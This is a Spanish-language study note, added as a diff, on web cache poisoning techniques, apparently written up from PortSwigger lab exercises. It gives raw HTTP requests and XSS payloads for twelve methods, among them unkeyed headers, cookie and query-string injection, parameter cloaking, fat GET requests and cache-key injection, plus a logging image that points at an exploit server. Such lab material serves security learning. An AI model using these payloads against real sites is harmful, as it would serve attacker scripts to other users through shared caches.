@@ -1,0 +1,466 @@
+
+---
+Tags: #headers #cabeceras #host #burpsuite #param-miner #poisoning #cache #xss
+
+---
+# Índice
+
+[[#Introducción y Conceptos Clave]]
+	
+[[#Tabla de Referencia de Cabeceras Especiales]]
+	
+[[#1. Poisoning con Header No Indexado (Unkeyed Header)]]
+	
+[[#2. Poisoning con Cookie No Indexada]]
+	
+[[#3. Poisoning con Múltiples Headers (Chaining)]]
+	
+[[#4. Poisoning Dirigido con Header Desconocido (Vary User-Agent)]]
+	
+[[#5. Poisoning con Query String/Param No Indexados]]
+	
+[[#6. Parameter Cloaking (Ocultación de Parámetros)]]
+	
+[[#7. Poisoning con Petición GET Anómala (Fat GET)]]
+	
+[[#8. Normalización de URL]]
+	
+[[#9. Poisoning para XSS DOM (Caché Estricta)]]
+	
+[[#10. Combinación de Vulnerabilidades (Chaining)]]
+	
+[[#11. Inyección en Clave de Caché (Key Injection)]]
+	
+[[#12. Poisoning de Caché Interna]]
+	
+[[#Resumen para tus Apuntes (Tabla de Cabeceras Avanzadas)]]
+
+---
+
+### Introducción y Conceptos Clave
+
+El **Web Cache Poisoning** ocurre cuando un atacante envía una petición con una entrada maliciosa (un "input unkeyed" o no indexado) que el servidor backend procesa e incluye en la respuesta, pero que el sistema de caché **ignora** al generar la "clave de caché" (cache key).
+
+1. **Cache Key:** Normalmente compuesta por la línea de petición (URL) y el `Host`. Si cambias esto, la caché ve una petición distinta.
+    
+2. **Unkeyed Input:** Cabeceras, cookies o parámetros que la caché ignora. Si cambias esto, la caché cree que es la _misma_ petición que una legítima.
+    
+3. **El Objetivo:** Lograr que la respuesta maliciosa generada por tu input se guarde en la caché y sea servida a usuarios legítimos.
+    
+
+---
+
+### Tabla de Referencia de Cabeceras Especiales
+
+En tus apuntes has utilizado varias cabeceras críticas. Aquí tienes una referencia técnica de su función en la explotación:
+
+|**Cabecera / Parámetro**|**Función Legítima**|**Uso en Explotación (Offensive)**|
+|---|---|---|
+|**`X-Forwarded-Host`**|Indica el host original solicitado por el cliente cuando pasa por un proxy inverso.|**Sobrescribir el host:** Obliga al backend a generar enlaces o scripts apuntando a tu servidor malicioso en lugar del legítimo.|
+|**`X-Forwarded-Scheme`**|Indica el protocolo original (http/https).|**Forzar redirecciones:** Al cambiarlo a `http` en un sitio `https`, el servidor puede intentar redirigir (301/302), permitiendo capturar esa redirección en caché.|
+|**`X-Host`**|Cabecera personalizada o de depuración (no estándar).|**Inyección oculta:** A menudo usada por frameworks internos para definir el host base. Ideal si `X-Forwarded-Host` está bloqueado.|
+|**`Vary`**|Instruye a la caché sobre qué cabeceras hacen que la respuesta varíe (ej. `User-Agent`).|**Targeting:** Si la caché varía por `User-Agent`, debes envenenar la caché específica para el navegador de la víctima, no la global.|
+|**`X-Original-Url`**|Usada por frameworks (como Symfony o ASP.NET) para sobreescribir la ruta solicitada.|**Bypass de Cache Key:** Permite acceder a una ruta distinta a la que ve la caché, confundiendo al mecanismo de almacenamiento.|
+|**`Pragma: x-get-cache-key`**|Cabecera de depuración (común en Akamai).|**Reconocimiento:** Permite ver en la respuesta qué elementos forman exactamente la "Cache Key". Vital para ataques complejos.|
+
+---
+
+### 1. Poisoning con Header No Indexado (Unkeyed Header)
+
+Esta es la forma más clásica de WCP. La caché confía en que el `Host` es la clave, pero el backend usa `X-Forwarded-Host` para construir rutas de recursos estáticos.
+
+**Discovery:**
+
+Utilizamos la extensión **Param Miner** de Burp Suite ("Guess headers"). Si la respuesta varía o refleja el valor de una cabecera inusual sin que cambie la respuesta de caché (cache hit/miss), es un candidato.
+
+**Análisis de tu PoC:**
+
+Tu petición manipula el origen de los scripts.
+
+```HTTP
+GET / HTTP/2
+Host: 0a310008032a1df880accb2e006b0085.web-security-academy.net
+X-Forwarded-Host: exploit-0a4c00a703921d308064ca6801ac005b.exploit-server.net
+```
+
+**Explicación de la Explotación:**
+
+1. El backend recibe la petición y ve `X-Forwarded-Host`.
+    
+2. Genera el HTML usando ese valor para construir la ruta del script `tracking.js`.
+    
+3. **La vulnerabilidad:** La caché (Varnish/CDN) **no incluye** `X-Forwarded-Host` en su llave. Solo mira `GET /` y el `Host` principal.
+    
+4. La caché guarda tu respuesta maliciosa.
+    
+5. Cualquier usuario que pida `GET /` recibirá el HTML con tu script:
+    
+```HTML
+<script src="//exploit-0a4c.../tracking.js"></script>
+```
+	
+---
+
+### 2. Poisoning con Cookie No Indexada
+
+A veces, las cookies se usan para renderizar contenido (como preferencias de usuario) pero no forman parte de la cache key (para ahorrar espacio en caché).
+
+**Discovery:**
+
+Param Miner ("Guess cookies"). Buscamos cookies que se reflejen en la respuesta pero que, al cambiarlas, la caché siga sirviendo el contenido como si fuera para cualquier usuario.
+
+**Análisis de tu PoC:**
+
+```HTTP
+GET / HTTP/2
+Cookie: fehost=a"}</script><img src=0 onerror=alert(1)>
+```
+
+**Explicación de la Explotación:**
+
+1. Identificas que la cookie `fehost` se refleja dentro de un objeto JSON en el HTML: `data = {"frontend":"[VALOR]"}`.
+    
+2. **Rompimiento de contexto:** Tu payload `a"}</script>` cierra el string JSON, cierra el objeto y cierra la etiqueta script.
+    
+3. **Inyección XSS:** Inmediatamente inyectas `<img src=0 onerror=alert(1)>`.
+    
+4. Al estar la cookie "unkeyed", la caché guarda este HTML roto y malicioso. Cuando otro usuario entra (incluso sin esa cookie), recibe tu XSS.
+    
+
+---
+
+### 3. Poisoning con Múltiples Headers (Chaining)
+
+A veces no podemos lograr un XSS directo, pero podemos secuestrar una redirección.
+
+**Discovery:**
+
+Requiere identificar dos comportamientos:
+
+1. Una cabecera que fuerce una redirección (ej. `X-Forwarded-Scheme: http` en un sitio HTTPS suele forzar un 301 a HTTPS).
+    
+2. Una cabecera que controle el destino de esa redirección (`X-Forwarded-Host`).
+    
+
+**Análisis de tu PoC:**
+
+Estás atacando un recurso JS (`/resources/js/tracking.js`).
+
+```HTTP
+GET /resources/js/tracking.js HTTP/2
+X-Forwarded-Scheme: hola  <-- (Valor inválido o http fuerza al backend a redirigir)
+X-Forwarded-Host: exploit-0a28...
+```
+
+**Explicación de la Explotación:**
+
+1. El backend piensa: "El usuario entró por protocolo inseguro (o desconocido), debo redirigirlo a la versión segura".
+    
+2. Para construir la URL de destino, usa el host que cree que es el correcto: tu `X-Forwarded-Host`.
+    
+3. Respuesta del servidor (que se cachea):
+    
+    `Location: https://exploit-0a28.../resources/js/tracking.js`
+    
+4. **Impacto:** Cuando la página legítima intente cargar el script `tracking.js`, la caché responderá con un 302 Redirect hacia **tu** servidor. El navegador de la víctima irá a tu servidor a buscar el JS y ejecutará tu código.
+    
+
+---
+
+### 4. Poisoning Dirigido con Header Desconocido (Vary: User-Agent)
+
+Este es un escenario avanzado. Si la respuesta contiene `Vary: User-Agent`, significa que la caché guarda una copia diferente de la web para cada navegador (Chrome, Firefox, iPhone, etc.).
+
+> **Concepto Crítico:** Si envenenas la caché usando tu navegador (ej. Chrome), solo afectarás a usuarios de Chrome. Si la víctima usa Firefox, estará a salvo.
+
+**Discovery:**
+
+Param Miner encuentra la cabecera oculta `X-Host`.
+
+**Análisis de tu PoC:**
+
+Tuviste que hacer un ataque en dos pasos (Recon + Exploit):
+
+1. **Fase de Reconocimiento (Loguear a la víctima):**
+    
+    Encontraste un XSS reflejado o un punto de inyección HTML que permitía cargar una imagen desde tu servidor.
+    
+	```HTML
+	<img src="https://mi-exploit-server.com/logger">
+	```
+	
+	   Colocaste esto en un comentario. Cuando la víctima lo ve, su navegador hace una petición a tu servidor. En tus logs (Access Log), verás el `User-Agent` exacto de la víctima.
+    
+2. **Fase de Poisoning (Targeting):**
+    
+    Usas ese User-Agent específico en tu petición de ataque.
+    
+    ```HTTP
+    GET / HTTP/1.1
+    User-Agent: Mozilla/5.0 (Victim) ... <-- UA robado de la víctima
+    X-Host: exploit-0a24... <-- Payload
+    ```
+    
+
+**Explicación:**
+
+Al coincidir el User-Agent, envenenas el "bucket" de caché específico que compartes con la víctima. El servidor toma `X-Host`, lo usa para importar un script (en este caso un `alert(document.cookie)`), y lo guarda solo para ese User-Agent.
+
+---
+
+### 5. Poisoning con Query String / Param No Indexados
+
+Las configuraciones de caché agresivas a menudo ignoran la query string completa (`GET /?q=...` se guarda como `GET /`) o parámetros específicos de rastreo (como `utm_content`, `utm_source`, etc.) para mejorar el rendimiento.
+
+**Discovery:**
+
+1. **Query String completa:** Añades `?canary=1` y ves si la respuesta es un "Cache Hit" de la página original. Si es así, la query string es ignorada.
+    
+2. **Parámetro específico:** Param Miner prueba parámetros comunes (`utm_`, `gclid`).
+    
+
+**Análisis de tus PoCs:**
+
+**Caso A: Query String completa (`?returnpath`)**
+
+```HTTP
+GET /?returnpath=a'/><img+src%3d0+onerror%3dalert(1)> HTTP/2
+```
+
+Aquí la caché ignora todo después del `?`, pero el backend usa `returnpath` para generar un `<link rel="canonical">`.
+
+- **Payload:** Rompes el atributo `href` con `'/>` e inyectas la etiqueta `img`.
+    
+- **Resultado:** Cualquier usuario que acceda a la Home, recibirá tu inyección porque la caché sirve la misma respuesta para `/` que para `/?returnpath=...`.
+    
+
+**Caso B: Parámetro Específico (`utm_content`)**
+
+```HTTP
+GET /?utm_content='/><script>alert(0)</script> HTTP/2
+```
+
+Similar al anterior, pero más sutil. La caché podría respetar otros parámetros, pero está configurada explícitamente para ignorar `utm_content` (muy común en CDNs para analíticas). El backend, sin embargo, refleja su valor ciegamente.
+
+---
+
+### 6. Parameter Cloaking (Ocultación de Parámetros)
+
+Esta técnica se basa en que la caché y el backend no se ponen de acuerdo sobre dónde empiezan y terminan los parámetros.
+
+**El Concepto:**
+
+La mayoría de las cachés consideran que el delimitador de parámetros es `&`. Sin embargo, algunos frameworks (como Ruby on Rails o Java) aceptan `;` como separador.
+
+**Análisis de tu PoC:**
+
+```HTTP
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=a;callback=alert(1)
+```
+
+**Explicación de la Explotación:**
+
+| **Componente**       | **Interpretación de la Caché** | **Interpretación del Backend**          |
+| -------------------- | ------------------------------ | --------------------------------------- |
+| `callback`           | `setCountryCookie`             | `setCountryCookie` (Primer valor)       |
+| `utm_content`        | `a;callback=alert(1)`          | `a`                                     |
+| **Parámetro Oculto** | **(No existe)**                | **`callback=alert(1)`** (Segundo valor) |
+
+1. **Caché:** Ve un parámetro `utm_content` (que está excluido/unkeyed) con un valor extraño. Como está excluido, lo ignora para la clave de caché. Guarda la respuesta asociada a `geolocate.js?callback=setCountryCookie`.
+    
+2. **Backend:** Ve dos parámetros `callback`. El último gana (`alert(1)`).
+    
+3. **Resultado:** El backend genera el JS con `alert(1)`. La caché lo guarda creyendo que es la versión segura. El usuario pide la URL limpia y recibe el malware.
+    
+
+---
+
+### 7. Poisoning con Petición GET Anómala (Fat GET)
+
+Este es un caso extremo de "Parameter Cloaking". Aunque `GET` no debería llevar cuerpo (body), algunos frameworks lo procesan si lo reciben.
+
+**Análisis de tu PoC:**
+
+```HTTP
+GET /js/geolocate.js?callback=setCountryCookie HTTP/2
+...
+Content-Length: 19
+
+callback=alert(1)
+```
+
+**Explicación:**
+
+- **La Caché:** Solo mira la URL (`query string`). No mira el cuerpo de un GET.
+    
+- **El Backend:** Es "amable" y lee el cuerpo, encontrando un parámetro `callback` que sobrescribe al de la URL.
+    
+- **Detección:** Param Miner prueba a enviar cuerpos en peticiones GET. Si la respuesta cambia pero la caché la sirve para peticiones sin cuerpo, es vulnerable.
+    
+
+---
+
+### 8. Normalización de URL
+
+Este ataque explota cómo los navegadores codifican (encode) los caracteres especiales frente a cómo Burp Suite puede enviarlos "crudos" (raw).
+
+**Análisis de tu PoC:**
+
+Envías una petición con `</p>` directamente en la URL.
+
+```HTTP
+GET /error</p><script>alert(1)</script> HTTP/2
+```
+
+**Explicación de la Explotación:**
+
+1. **Envío (Atacante):** Usas Burp para enviar los caracteres `<` y `>` sin codificar.
+    
+2. **Backend:** Refleja la URL tal cual en el mensaje de error "Not Found: /error...".
+    
+3. **Caché:** Guarda esa respuesta exacta asociada a esa URL.
+    
+4. **Víctima:** Visita `https://web.com/error</p><script>...`.
+    
+5. **El Truco:** El navegador de la víctima codificará la URL a `/error%3C%2F...`. La caché normaliza (decodifica) la petición entrante para ver si tiene una coincidencia.
+    
+    - Petición Víctima: `/error%3C...` -> Normalización Caché -> `/error<...`
+        
+    - ¡Coincidencia! La caché devuelve la respuesta guardada (que contiene el payload reflejado sin codificar). El navegador ejecuta el script.
+        
+
+---
+
+### 9. Poisoning para XSS DOM (Caché Estricta)
+
+Cuando no puedes cambiar el JS directamente porque la caché es estricta, atacas los **datos** que ese JS consume.
+
+**Análisis de tu PoC:**
+
+El script legítimo hace esto:
+
+```JavaScript
+initGeoLocate('//' + data.host + '/resources/json/geolocate.json');
+```
+
+Tú envenenas `data.host` usando `X-Forwarded-Host`.
+
+**Explicación:**
+
+1. Consigues que la caché guarde `data = {"host": "tu-servidor-exploit"}`.
+    
+2. Cuando la víctima carga la página, el script legítimo construye la URL apuntando a TU servidor.
+    
+3. El `fetch()` del navegador pide el JSON a tu servidor.
+    
+4. **Punto Crítico (CORS):** Para que el navegador acepte leer el JSON de un dominio externo, tu servidor exploit DEBE tener la cabecera:
+    
+    `Access-Control-Allow-Origin: *`
+    
+5. Tu JSON malicioso contiene HTML (`<img src=x...>`) que el script legítimo inserta en el DOM mediante `innerHTML` o `appendChild`.
+    
+
+---
+
+### 10. Combinación de Vulnerabilidades (Chaining)
+
+Este es el ataque más sofisticado de tus apuntes. Requiere encadenar múltiples fallos para lograr el objetivo.
+
+**Flujo del Ataque:**
+
+1. **Envenenar la traducción (JSON):** Manipulas `/?localized=1` para que cargue las traducciones desde tu servidor (similar al punto 9).
+    
+2. **Redirigir a la víctima:** Necesitas que la víctima, al entrar a la home (`/`), cargue la versión "español" (que está envenenada), aunque su idioma sea inglés.
+    
+
+**Explicación de la Cabecera `X-Original-Url` (Tu pregunta específica):**
+
+> **¿Qué es `X-Original-Url`?**
+> 
+> Es una cabecera usada por frameworks (como Symfony o ASP.NET) para decirle a la aplicación: "Ignora la URL real que te ha llegado, procesa ESTA ruta en su lugar".
+
+> **¿Por qué la usas aquí?**
+> 
+> Para "desincronizar" la caché del backend.
+> 
+> - **Caché ve:** `GET /` (Limpio).
+>     
+> - **Backend ve:** `X-Original-Url: /setlang\es` (Petición de cambio de idioma).
+>     
+
+> **¿Por qué `/setlang\es` (barra invertida) y no `/setlang/es`?**
+> 
+> Esto se llama **Path Normalization Bypass**.
+> 
+> Si usas `/setlang/es`, es posible que la caché detecte que es una ruta diferente o que no coincida con la home.
+> 
+> - Muchos servidores normalizan `\` convirtiéndolo en `/`.
+>     
+> - Pero la caché a menudo ve `\` como un carácter normal de un nombre de archivo, no como un separador de directorios.
+>     
+> - **Resultado:** Engañas a la caché para que crea que es un archivo estático o una ruta válida asociada a la Home, mientras el backend ejecuta la lógica de "Set Language".
+>     
+
+---
+
+### 11. Inyección en Clave de Caché (Key Injection)
+
+Este ataque ocurre cuando la aplicación refleja cabeceras en la respuesta que, a su vez, forman parte de la clave de caché.
+
+**Análisis de tus PoCs (El uso de `$$` y `Pragma`):**
+
+1. **`Pragma: x-get-cache-key`:**
+    
+    - Esta cabecera (típica de Akamai) le pide al servidor que te devuelva en la respuesta _qué elementos están formando la clave de caché_. Es vital para entender qué estás atacando.
+        
+2. **Separadores `$$`:**
+    
+    - Indican que estás intentando inyectar delimitadores internos de la caché. Si la caché construye su clave interna como `URL$$HEADER$$COOKIE`, y tú envías una URL que contiene `$$`, puedes romper la estructura y hacer que la caché confunda partes de la URL con cabeceras.
+        
+3. **El ataque (Explicación simplificada):**
+    
+    - Intentas inyectar parámetros (`origin`, `content-length`) dentro de la estructura interna de la caché.
+        
+    - Si logras inyectar `Content-Length`, puedes causar un **Cache Poisoning DoS** (haciendo que la caché crea que el contenido es más corto de lo que es) o desincronizar respuestas futuras.
+        
+    - En tu ejemplo, estás forzando un redireccionamiento (`/login`) con parámetros contaminados que la caché, por error de parsing interno debido a los `$$`, almacena incorrectamente.
+        
+
+---
+
+### 12. Poisoning de Caché Interna
+
+A diferencia de CDNs externas (Cloudflare), estas cachés viven dentro del servidor de aplicaciones (ej. Varnish local, caché de Django/Rails).
+
+**Explicación:**
+
+Estas cachés suelen ser más efímeras y no respetan las mismas reglas que las CDNs. A menudo cachean fragmentos de la página (fragments), no la página entera.
+
+**¿Cómo explotarlo y detectarlo?**
+
+1. **Timing / Race Condition:** Como indicas, mandas peticiones en bucle.
+    
+    - Si la caché dura 10 segundos, tienes una ventana de milisegundos cada 10 segundos para ser el primero en llegar justo cuando la caché expira. Tu petición maliciosa (con `X-Forwarded-Host`) regenerará el contenido.
+        
+2. **Detección sin fuerza bruta (Buster):**
+    
+    - Usa la extensión "Cache Cloaking" o técnicas de **Cache Buster** dinámico (añadir `?cb=1`, `?cb=2` incrementales) para ver si cada nueva query string genera una respuesta fresca que refleja tu cabecera.
+        
+    - Si siempre se refleja en una URL nueva, pero a veces no en la URL base, hay una caché interna.
+        
+
+---
+
+### Resumen para tus Apuntes (Tabla de Cabeceras Avanzadas)
+
+Aquí tienes la tabla que me pediste para agrupar las cabeceras explicadas en estas dos partes.
+
+|**Cabecera**|**Tipo**|**Función en Explotación**|
+|---|---|---|
+|`X-Forwarded-Host`|Estándar|Redirigir cargas de scripts/imágenes a servidor atacante.|
+|`X-Forwarded-Scheme`|Estándar|Forzar redirecciones 301/302 para cachearlas.|
+|`X-Original-Url`|Framework|Sobrescribir la ruta que ve el backend (Bypass de reglas).|
+|`X-Rewrite-Url`|Framework|Similar a `X-Original-Url` (común en ASP.NET).|
+|`X-Host`|Custom|Alternativa a `X-Forwarded-Host` si este está bloqueado.|
+|`Pragma: x-get-cache-key`|Debug|Revela los componentes de la llave de caché (Akamai).|
+|`Vary`|Respuesta|Indica qué cabecera del cliente segmenta la caché (Targeting).|
